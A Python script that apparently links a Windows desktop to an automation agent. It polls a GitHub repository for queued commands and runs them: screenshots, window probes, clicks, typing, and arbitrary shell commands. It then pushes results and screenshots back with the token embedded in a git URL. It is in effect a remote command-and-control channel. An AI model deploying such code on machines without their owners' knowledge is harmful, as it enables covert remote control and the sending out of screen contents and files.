import os, time, json, requests, subprocess, pyautogui, psutil, ctypes
from PIL import ImageGrab
import sys
from datetime import datetime, timezone
from pathlib import Path

# CONFIGURATION
TOKEN = sys.argv[1] if len(sys.argv) > 1 else ""
REPO = "thekung62b-jpg/wealth-machine"
CMD_FILE = "commands.json"
BASE_DIR = Path(__file__).resolve().parent
OUT_FILE = BASE_DIR / "output.json"
STATE_FILE = BASE_DIR / ".openclaw_bridge_state.json"
LAST_FRAME_FILE = BASE_DIR / "last_frame.png"
GITHUB_API = f"https://api.github.com/repos/{REPO}/contents/{CMD_FILE}"
session = requests.Session()

print(f"--- V2 NEURAL LINK ACTIVE ---")
print(f"LISTENING ON {os.getenv('COMPUTERNAME')}...")

def load_executed_ids():
    try:
        with open(STATE_FILE, "r") as f:
            payload = json.load(f)
        ids = payload.get("executed_ids", [])
        if isinstance(ids, list):
            return set(str(item) for item in ids)
    except FileNotFoundError:
        return set()
    except Exception:
        return set()
    return set()

def save_executed_ids(executed_ids):
    with open(STATE_FILE, "w") as f:
        json.dump({"executed_ids": sorted(executed_ids)}, f)

executed_ids = load_executed_ids()

def extract_commands(payload):
    if not isinstance(payload, dict):
        return []

    queued = payload.get("commands")
    if isinstance(queued, list):
        return [cmd for cmd in queued if isinstance(cmd, dict)]

    # Backward compatibility for the legacy single-command shape.
    if payload.get("id") and payload.get("cmd"):
        return [payload]

    return []

def take_screenshot():
    ss = ImageGrab.grab()
    ss.save(LAST_FRAME_FILE)
    return "SCREENSHOT_SAVED"

def browser_probe():
    if os.name != "nt":
        raise RuntimeError("browser_probe is only supported on Windows")

    user32 = ctypes.windll.user32
    user32.GetForegroundWindow.restype = ctypes.c_void_p
    user32.GetWindowThreadProcessId.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
    user32.GetWindowTextLengthW.argtypes = [ctypes.c_void_p]
    user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]

    hwnd = user32.GetForegroundWindow()
    pid = ctypes.c_ulong()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

    title_len = user32.GetWindowTextLengthW(hwnd)
    title_buf = ctypes.create_unicode_buffer(max(title_len + 1, 512))
    user32.GetWindowTextW(hwnd, title_buf, len(title_buf))

    process_name = ""
    process_id = int(pid.value)
    if process_id:
        try:
            process_name = psutil.Process(process_id).name()
        except psutil.Error:
            process_name = ""

    take_screenshot()
    return {
        "hwnd": int(hwnd or 0),
        "process_id": process_id,
        "process_name": process_name,
        "title": title_buf.value,
    }

def iso_now():
    return datetime.now(timezone.utc).isoformat()

def write_result(cmd_id, status, started_at, result="", stdout="", stderr="", exit_code=None, artifact=""):
    payload = {
        "id": cmd_id,
        "status": status,
        "host": os.getenv("COMPUTERNAME"),
        "started_at": started_at,
        "finished_at": iso_now(),
        "result": result,
        "stdout": stdout,
        "stderr": stderr,
        "exit_code": exit_code,
    }
    if artifact:
        payload["artifact"] = artifact

    with open(OUT_FILE, "w") as f:
        json.dump(payload, f)

while True:
    try:
        headers = {"Authorization": f"token {TOKEN}", "Accept": "application/vnd.github.v3.raw"}
        r = session.get(GITHUB_API, headers=headers, timeout=(10, 30))
        if r.status_code == 200:
            payload = r.json()
            commands = extract_commands(payload)
            for data in commands:
                if data.get("id") in executed_ids:
                    continue

                target_host = data.get("host")
                if target_host and target_host != os.getenv("COMPUTERNAME"):
                    continue

                target_os = data.get("os")
                if target_os and target_os.lower() != "windows":
                    continue

                cmd_id, action = data.get("id"), data.get("cmd")
                if not cmd_id or not action:
                    continue

                print(f"EXECUTE[{cmd_id}]: {action}")
                started_at = iso_now()

                try:
                    if action == "screenshot":
                        result = take_screenshot()
                        write_result(cmd_id, "done", started_at, result=result, artifact=str(LAST_FRAME_FILE))
                    elif action == "browser_probe":
                        probe = browser_probe()
                        write_result(
                            cmd_id,
                            "done",
                            started_at,
                            result=json.dumps(probe),
                            stdout=json.dumps(probe),
                            exit_code=0,
                            artifact=str(LAST_FRAME_FILE),
                        )
                    elif action.startswith("click "):
                        x, y = map(int, action.split(" ")[1].split(","))
                        pyautogui.click(x, y)
                        write_result(cmd_id, "done", started_at, result=f"Clicked {x},{y}")
                    elif action.startswith("type "):
                        pyautogui.write(action.replace("type ", ""), interval=0.1)
                        write_result(cmd_id, "done", started_at, result="Typed")
                    else:
                        proc = subprocess.run(action, shell=True, capture_output=True, text=True)
                        result = proc.stdout if proc.stdout else proc.stderr
                        status = "done" if proc.returncode == 0 else "failed"
                        write_result(
                            cmd_id,
                            status,
                            started_at,
                            result=result,
                            stdout=proc.stdout,
                            stderr=proc.stderr,
                            exit_code=proc.returncode,
                        )
                except Exception as cmd_error:
                    write_result(cmd_id, "failed", started_at, result=str(cmd_error), stderr=str(cmd_error))

                executed_ids.add(cmd_id)
                save_executed_ids(executed_ids)
                
                # DIAGNOSTIC PUSH
                print("Attempting to push...")
                push_cmd = f'git add . && git commit -m "Result {cmd_id}" && git pull origin master --no-rebase && git push https://{TOKEN}@github.com/{REPO}.git master'
                push_result = subprocess.run(push_cmd, shell=True, capture_output=True, text=True)
                print(f"GIT STDOUT: {push_result.stdout}")
                print(f"GIT STDERR: {push_result.stderr}")

        time.sleep(5)
    except Exception as e:
        print(f"Link Error: {e}"); time.sleep(5)
